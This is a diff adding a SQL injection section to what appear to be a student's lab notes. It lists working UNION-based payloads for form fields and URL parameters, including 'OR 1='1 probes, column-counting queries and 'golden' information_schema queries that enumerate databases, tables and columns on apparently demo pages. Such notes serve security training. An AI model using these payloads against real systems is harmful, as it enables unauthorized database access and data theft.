@@ -145,6 +145,60 @@ ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000
 
 
 
+SQL INJECTION
+
+
+POST METHOD (input box)
+how to check for vulnverable input field:
+Audi 'OR 1='1
+
+find number of colums were working with
+Audi 'Union select 1,2,3,4,5 #
+
+Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables
+
+golden rule
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+
+molding the statement to get the information we want example
+Audi' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #
+
+
+
+
+
+
+GET METHOD (URL MANIPULATION)
+
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables   <!—Displays all table names in the database -->
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables   <!—Displays all databases and the names of their tables --> 
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns   <!—Display all tables and the columns they contain -->
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #   <!-- "Golden" statement -->
+<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car   <!-- Using information pulled from the Golden Statement to query a different table -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
